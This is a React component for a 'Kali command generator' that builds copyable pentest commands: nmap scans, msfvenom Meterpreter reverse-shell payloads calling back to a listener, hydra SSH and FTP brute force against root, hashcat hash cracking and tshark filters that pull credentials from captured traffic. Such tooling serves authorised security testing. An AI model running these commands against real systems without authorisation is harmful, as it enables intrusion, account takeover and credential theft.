import React, { useState } from 'react';
import { Wrench, Copy, Check, Terminal, Shield, Network, Lock, Search, FileCode } from 'lucide-react';
import { audioFX } from '../utils/audioFX';

export default function SecurityToolkit() {
  const [selectedTool, setSelectedTool] = useState('nmap');
  const [target, setTarget] = useState('192.168.1.1');
  const [copiedIndex, setCopiedIndex] = useState(null);

  // Tool specific options
  const [nmapScanType, setNmapScanType] = useState('-sS -sV -sC');
  const [nmapPort, setNmapPort] = useState('1-10000');
  const [nmapTiming, setNmapTiming] = useState('-T4');

  const [msfPayload, setMsfPayload] = useState('linux/x64/meterpreter/reverse_tcp');
  const [msfLhost, setMsfLhost] = useState('10.0.0.5');
  const [msfLport, setMsfLport] = useState('4444');

  const [wordlist, setWordlist] = useState('/usr/share/wordlists/rockyou.txt');
  const [gobusterDir, setGobusterDir] = useState('/usr/share/wordlists/dirb/common.txt');

  const tools = [
    { id: 'nmap', name: 'Nmap Scanner', icon: Network, category: 'Network Recon' },
    { id: 'msfvenom', name: 'Msfvenom Payload', icon: Lock, category: 'Exploit Crafting' },
    { id: 'gobuster', name: 'Gobuster Dir', icon: Search, category: 'Web Fuzzing' },
    { id: 'hydra', name: 'Hydra Password', icon: Shield, category: 'Brute Force' },
    { id: 'hashcat', name: 'Hashcat Cracker', icon: FileCode, category: 'Hash Analysis' },
    { id: 'wireshark', name: 'Tshark Sniffer', icon: Terminal, category: 'Packet Capture' }
  ];

  const handleCopy = (text, idx) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(idx);
    audioFX.playSuccess();
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  const getGeneratedCommands = () => {
    switch (selectedTool) {
      case 'nmap':
        return [
          {
            title: 'Stealth OS & Version Detection',
            cmd: `nmap ${nmapScanType} ${nmapTiming} -p ${nmapPort} ${target} -oA nmap_audit`,
            desc: 'Performs SYN stealth scan, version detection, and default NSE vulnerability scripts.'
          },
          {
            title: 'UDP Fast Port Scan',
            cmd: `nmap -sU --top-ports 50 ${nmapTiming} ${target}`,
            desc: 'Scans top 50 common UDP ports for DNS, SNMP, DHCP services.'
          },
          {
            title: 'Aggressive Script Vulnerability Scan',
            cmd: `nmap --script vuln ${target}`,
            desc: 'Executes all NSE vulnerability detection scripts against target.'
          }
        ];
      case 'msfvenom':
        return [
          {
            title: 'Linux ELF x64 Meterpreter Payload',
            cmd: `msfvenom -p ${msfPayload} LHOST=${msfLhost} LPORT=${msfLport} -f elf -o shell.elf`,
            desc: 'Generates standalone executable ELF binary for 64-bit Linux targets.'
          },
          {
            title: 'Windows Executable (EXE) Payload',
            cmd: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${msfLhost} LPORT=${msfLport} -f exe -o payload.exe`,
            desc: 'Generates Windows x64 reverse TCP meterpreter payload.'
          },
          {
            title: 'PHP Web Shell Payload',
            cmd: `msfvenom -p php/meterpreter_reverse_tcp LHOST=${msfLhost} LPORT=${msfLport} -f raw -o shell.php`,
            desc: 'Creates raw PHP reverse shell payload for web server exploitation.'
          }
        ];
      case 'gobuster':
        return [
          {
            title: 'Directory & File Enumeration',
            cmd: `gobuster dir -u http://${target} -w ${gobusterDir} -x php,html,txt,json -t 50`,
            desc: 'Discovers hidden web directories and files matching specific extensions.'
          },
          {
            title: 'Subdomain Brute-forcing (DNS)',
            cmd: `gobuster dns -d ${target} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`,
            desc: 'Brute-forces subdomains using DNS resolution.'
          }
        ];
      case 'hydra':
        return [
          {
            title: 'SSH Brute Force Attack',
            cmd: `hydra -l root -P ${wordlist} ssh://${target} -t 4 -V`,
            desc: 'Brute-forces SSH login for root account using RockYou wordlist.'
          },
          {
            title: 'FTP Login Brute Force',
            cmd: `hydra -L /usr/share/wordlists/users.txt -P ${wordlist} ftp://${target} -V`,
            desc: 'Brute-forces FTP authentication with user and password lists.'
          }
        ];
      case 'hashcat':
        return [
          {
            title: 'MD5 Hash Crack (Mode 0)',
            cmd: `hashcat -m 0 -a 0 hashes.txt ${wordlist} --force`,
            desc: 'Cracks MD5 password hashes using dictionary attack.'
          },
          {
            title: 'NTLM / Windows Hash Crack (Mode 1000)',
            cmd: `hashcat -m 1000 -a 0 ntlm_hashes.txt ${wordlist} -r /usr/share/hashcat/rules/best64.rule`,
            desc: 'Cracks Windows NTLM hashes with Best64 mutation rules.'
          }
        ];
      case 'wireshark':
        return [
          {
            title: 'Capture HTTP GET & POST Requests',
            cmd: `tshark -i eth0 -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri`,
            desc: 'Live packet capture filtering for HTTP requests on eth0 interface.'
          },
          {
            title: 'Filter Passwords & Credentials in PCAP',
            cmd: `tshark -r capture.pcap -Y "http.request.method == POST" -V | grep -iE "pass|user|auth"`,
            desc: 'Searches existing PCAP file for POST request payload credentials.'
          }
        ];
      default:
        return [];
    }
  };

  const commands = getGeneratedCommands();

  return (
    <div className="glass-panel" style={{ flex: 1, padding: '1.25rem', height: 'calc(100vh - 120px)', overflowY: 'auto' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1.25rem' }}>
        <div>
          <h2 className="font-display glow-cyan" style={{ fontSize: '1.1rem', margin: 0 }}>
            KALI COMMAND GENERATOR // SECURITY TOOLKIT
          </h2>
          <p className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
            Select a tool, configure targets and parameters, and generate production-ready Kali commands.
          </p>
        </div>
      </div>

      {/* Tool Selection Tabs */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(160px, 1fr))', gap: '0.6rem', marginBottom: '1.5rem' }}>
        {tools.map((t) => {
          const Icon = t.icon;
          const isSel = selectedTool === t.id;
          return (
            <button
              key={t.id}
              onClick={() => {
                setSelectedTool(t.id);
                audioFX.playClick();
              }}
              style={{
                background: isSel ? 'rgba(0, 243, 255, 0.15)' : 'rgba(13, 17, 26, 0.6)',
                border: isSel ? '1px solid var(--neon-cyan)' : '1px solid rgba(255,255,255,0.06)',
                borderRadius: '8px',
                padding: '0.8rem',
                cursor: 'pointer',
                textAlign: 'left',
                transition: 'all 0.2s ease'
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '0.3rem' }}>
                <Icon size={16} color={isSel ? 'var(--neon-cyan)' : 'var(--text-muted)'} />
                <span className="font-display" style={{ fontSize: '0.82rem', fontWeight: 600, color: isSel ? 'var(--neon-cyan)' : 'var(--text-main)' }}>
                  {t.name}
                </span>
              </div>
              <span className="badge badge-cyan" style={{ fontSize: '0.62rem' }}>{t.category}</span>
            </button>
          );
        })}
      </div>

      {/* Target & Parameter Inputs */}
      <div className="glass-card" style={{ marginBottom: '1.5rem', background: 'rgba(7, 9, 14, 0.7)' }}>
        <h4 className="font-display glow-green" style={{ fontSize: '0.85rem', marginBottom: '0.8rem' }}>
          CONFIGURABLE PARAMETERS
        </h4>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '1rem' }}>
          <div>
            <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
              Target IP / Domain / Subnet
            </label>
            <input
              type="text"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              className="cyber-input"
            />
          </div>

          {selectedTool === 'nmap' && (
            <>
              <div>
                <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
                  Scan Type Flags
                </label>
                <input
                  type="text"
                  value={nmapScanType}
                  onChange={(e) => setNmapScanType(e.target.value)}
                  className="cyber-input"
                />
              </div>
              <div>
                <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
                  Port Range (-p)
                </label>
                <input
                  type="text"
                  value={nmapPort}
                  onChange={(e) => setNmapPort(e.target.value)}
                  className="cyber-input"
                />
              </div>
            </>
          )}

          {selectedTool === 'msfvenom' && (
            <>
              <div>
                <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
                  LHOST (Listener IP)
                </label>
                <input
                  type="text"
                  value={msfLhost}
                  onChange={(e) => setMsfLhost(e.target.value)}
                  className="cyber-input"
                />
              </div>
              <div>
                <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
                  LPORT (Listener Port)
                </label>
                <input
                  type="text"
                  value={msfLport}
                  onChange={(e) => setMsfLport(e.target.value)}
                  className="cyber-input"
                />
              </div>
            </>
          )}

          {(selectedTool === 'hydra' || selectedTool === 'hashcat') && (
            <div>
              <label className="font-mono" style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.3rem' }}>
                Wordlist Path
              </label>
              <input
                type="text"
                value={wordlist}
                onChange={(e) => setWordlist(e.target.value)}
                className="cyber-input"
              />
            </div>
          )}
        </div>
      </div>

      {/* Generated Commands Output List */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
        {commands.map((c, idx) => (
          <div key={idx} className="glass-card" style={{ background: '#05070a', border: '1px solid rgba(0, 243, 255, 0.2)' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <Terminal size={15} color="var(--neon-green)" />
                <span className="font-display glow-green" style={{ fontSize: '0.85rem', fontWeight: 600 }}>
                  {c.title}
                </span>
              </div>
              <button
                onClick={() => handleCopy(c.cmd, idx)}
                className="cyber-btn"
                style={{ padding: '0.3rem 0.8rem', fontSize: '0.75rem' }}
              >
                {copiedIndex === idx ? (
                  <>
                    <Check size={13} /> COPIED!
                  </>
                ) : (
                  <>
                    <Copy size={13} /> COPY COMMAND
                  </>
                )}
              </button>
            </div>
            <p className="font-mono" style={{ fontSize: '0.73rem', color: 'var(--text-muted)', marginBottom: '0.6rem' }}>
              {c.desc}
            </p>
            <div style={{ background: '#0a0d14', padding: '0.75rem 0.9rem', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.06)' }}>
              <code className="font-mono glow-cyan" style={{ fontSize: '0.85rem', wordBreak: 'break-all' }}>
                {c.cmd}
              </code>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
